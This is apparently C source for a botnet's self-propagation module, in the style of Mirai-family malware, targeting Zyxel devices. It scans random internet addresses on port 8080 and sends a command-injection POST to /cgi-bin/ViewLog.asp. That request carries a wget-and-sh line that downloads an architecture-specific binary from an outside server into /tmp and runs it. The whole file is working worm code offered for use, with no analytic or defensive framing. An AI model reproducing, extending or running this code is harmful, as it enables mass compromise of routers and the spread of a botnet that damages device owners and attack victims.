#include "includes.h"
#include "zyxel.h"
#include "rand.h"
#include "util.h"

#ifdef SELFREP

#define ZYXEL_SCANNER_MAX_CONNS 256
#define ZYXEL_SCANNER_PORT 8080

/* Zyxel command injection payload */
static char *zyxel_payload = 
"POST /cgi-bin/ViewLog.asp HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Type: application/x-www-form-urlencoded\r\n"
"Content-Length: %d\r\n"
"Connection: close\r\n\r\n"
"%s";

static char *zyxel_post_data = 
"start_time=123456&end_time=123457&";

struct zyxel_conn {
    int fd;
    ipv4_t dst_addr;
    time_t last_recv;
};

static struct zyxel_conn conns[ZYXEL_SCANNER_MAX_CONNS];

static ipv4_t get_random_ip_zyxel(void);
static void zyxel_connect(struct zyxel_conn *);
static void zyxel_close(struct zyxel_conn *);

void zyxel_scanner_init(void) {
    if (fork() == 0) {
        int i;
        
        for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
            conns[i].fd = -1;
        }
        
        while (TRUE) {
            fd_set fdset;
            struct timeval tv;
            int maxfd = 0;
            
            FD_ZERO(&fdset);
            
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1) {
                    FD_SET(conns[i].fd, &fdset);
                    if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                }
            }
            
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            
            select(maxfd + 1, &fdset, NULL, NULL, &tv);
            
            time_t now = time(NULL);
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && now - conns[i].last_recv > 10) {
                    zyxel_close(&conns[i]);
                }
            }
            
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && FD_ISSET(conns[i].fd, &fdset)) {
                    char buf[4096];
                    int n = recv(conns[i].fd, buf, sizeof(buf), 0);
                    if (n <= 0) {
                        zyxel_close(&conns[i]);
                    } else {
                        conns[i].last_recv = now;
                        zyxel_close(&conns[i]);
                    }
                }
            }
            
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd == -1) {
                    conns[i].dst_addr = get_random_ip_zyxel();
                    zyxel_connect(&conns[i]);
                    break;
                }
            }
            
            sleep(1);
        }
    }
}

static ipv4_t get_random_ip_zyxel(void) {
    ipv4_t addr;

    while (TRUE) {
        addr = rand_next();

        /* Target European, Asian, Latin American, Middle East, Africa - expanded */
        uint8_t first_octet = (addr >> 24) & 0xFF;

        /* Global ranges for Zyxel devices (descending order) */
        if (first_octet == 223 || first_octet == 222 || first_octet == 221 ||  /* Asia */
            first_octet == 220 || first_octet == 219 || first_octet == 218 ||  /* Europe/Asia */
            first_octet == 217 || first_octet == 213 || first_octet == 212 ||  /* Asia/Europe */
            first_octet == 211 || first_octet == 210 || first_octet == 203 ||  /* LatAm/Asia */
            first_octet == 202 || first_octet == 201 || first_octet == 200 ||  /* US/LatAm */
            first_octet == 199 || first_octet == 198 || first_octet == 197 ||  /* Europe/Africa */
            first_octet == 196 || first_octet == 195 || first_octet == 194 ||  /* Europe/Africa */
            first_octet == 193 || first_octet == 192 || first_octet == 191 ||  /* LatAm */
            first_octet == 190 || first_octet == 189 || first_octet == 188 ||  /* LatAm/Asia */
            first_octet == 187 || first_octet == 186 || first_octet == 185 ||  /* Asia */
            first_octet == 184 || first_octet == 183 || first_octet == 182 ||  /* Asia/Middle East */
            first_octet == 181 || first_octet == 180 || first_octet == 179 ||  /* LatAm/Asia */
            first_octet == 178 || first_octet == 177 || first_octet == 176 ||  /* Asia/LatAm */
            first_octet == 175 || first_octet == 174 || first_octet == 173 ||  /* Asia/US */
            first_octet == 172 || first_octet == 171 || first_octet == 170 ||  /* Asia/Africa */
            first_octet == 169 || first_octet == 168 || first_octet == 167 ||  /* Asia/Africa */
            first_octet == 166 || first_octet == 165 || first_octet == 164 ||  /* Asia/Africa */
            first_octet == 163 || first_octet == 162 || first_octet == 161 ||  /* Asia/Africa */
            first_octet == 160 || first_octet == 159 || first_octet == 158 ||  /* Asia/Africa */
            first_octet == 157 || first_octet == 156 || first_octet == 155 ||  /* Asia/Africa */
            first_octet == 154 || first_octet == 153 || first_octet == 125 ||  /* Asia */
            first_octet == 124 || first_octet == 123 || first_octet == 122 ||  /* Asia */
            first_octet == 121 || first_octet == 120 || first_octet == 119 ||  /* Asia */
            first_octet == 118 || first_octet == 117 || first_octet == 116 ||  /* Asia */
            first_octet == 115 || first_octet == 114 || first_octet == 113 ||  /* Asia */
            first_octet == 112 || first_octet == 111 || first_octet == 110 ||  /* Asia/Europe */
            first_octet == 109 || first_octet == 108 || first_octet == 107 ||  /* Asia/LatAm */
            first_octet == 106 || first_octet == 105 || first_octet == 104 ||  /* Asia/Africa */
            first_octet == 103 || first_octet == 102 || first_octet == 101 ||  /* Europe/Asia */
            first_octet == 95 || first_octet == 94 || first_octet == 93 ||     /* Europe */
            first_octet == 92 || first_octet == 91 || first_octet == 90 ||     /* Europe */
            first_octet == 89 || first_octet == 88 || first_octet == 87 ||     /* Europe */
            first_octet == 86 || first_octet == 85 || first_octet == 84 ||     /* Europe */
            first_octet == 83 || first_octet == 82 || first_octet == 81 ||     /* Europe/Asia */
            first_octet == 80 || first_octet == 79 || first_octet == 78 ||     /* Europe */
            first_octet == 77 || first_octet == 76 || first_octet == 75 ||     /* US/Europe */
            first_octet == 74 || first_octet == 73 || first_octet == 72 ||     /* US */
            first_octet == 71 || first_octet == 70 || first_octet == 69 ||     /* US */
            first_octet == 68 || first_octet == 67 || first_octet == 66 ||     /* US */
            first_octet == 65 || first_octet == 64 || first_octet == 63 ||     /* Asia/Europe */
            first_octet == 62 || first_octet == 61 || first_octet == 60 ||     /* Asia */
            first_octet == 59 || first_octet == 58 || first_octet == 57 ||     /* Europe */
            first_octet == 56 || first_octet == 55 || first_octet == 54 ||     /* Europe */
            first_octet == 53 || first_octet == 52 || first_octet == 51 ||     /* Europe */
            first_octet == 50 || first_octet == 49 || first_octet == 48 ||     /* Middle East/Europe */
            first_octet == 47 || first_octet == 46 || first_octet == 45 ||     /* Asia/Middle East */
            first_octet == 44 || first_octet == 43 || first_octet == 42 ||     /* Africa/Asia */
            first_octet == 41 || first_octet == 40 || first_octet == 39 ||     /* Asia/Europe */
            first_octet == 38 || first_octet == 37 || first_octet == 36 ||     /* Asia/Europe */
            first_octet == 31 || first_octet == 27 || first_octet == 14 ||     /* Asia-Pacific */
            first_octet == 2 || first_octet == 1) { /* Asia-Pacific */
            break;
        }
    }

    return addr;
}

static void zyxel_connect(struct zyxel_conn *conn) {
    struct sockaddr_in addr;
    
    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) return;
    
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(ZYXEL_SCANNER_PORT);
    
    if (connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr)) == 0 || errno == EINPROGRESS) {
        char host[32];
        snprintf(host, sizeof(host), "%d.%d.%d.%d",
            (conn->dst_addr >> 24) & 0xFF,
            (conn->dst_addr >> 16) & 0xFF,
            (conn->dst_addr >> 8) & 0xFF,
            conn->dst_addr & 0xFF);
        
        char post[512];
        snprintf(post, sizeof(post), "%swget http://HTTP_SERVER/bins/axis.$(uname -m) -O /tmp/z;sh /tmp/z", zyxel_post_data);
        
        char payload[1024];
        snprintf(payload, sizeof(payload), zyxel_payload, host, util_strlen(post), post);
        
        send(conn->fd, payload, util_strlen(payload), 0);
        conn->last_recv = time(NULL);
    } else {
        close(conn->fd);
        conn->fd = -1;
    }
}

static void zyxel_close(struct zyxel_conn *conn) {
    if (conn->fd != -1) {
        close(conn->fd);
        conn->fd = -1;
    }
}

#endif
